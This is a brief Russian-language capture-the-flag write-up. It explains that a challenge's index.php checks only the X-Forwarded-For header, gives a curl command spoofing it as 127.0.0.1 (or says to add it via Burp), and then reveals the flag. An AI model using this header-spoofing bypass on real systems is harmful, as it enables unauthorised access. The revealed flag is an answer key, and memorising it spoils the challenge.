## После изучения исходника [index.php](index.php) видим что он проверяет лишь HTTP-X-FORWARD а его легко подменить 
Можно через curl
```
curl -H "X-Forwarded-For: 127.0.0.1" http://chal.competitivecyber.club:8081
```
А можно и через burp перехватить запрос и добавить хедер
## Получаем флаг CACI{1_lik3_g1raff3s_4_l0t}
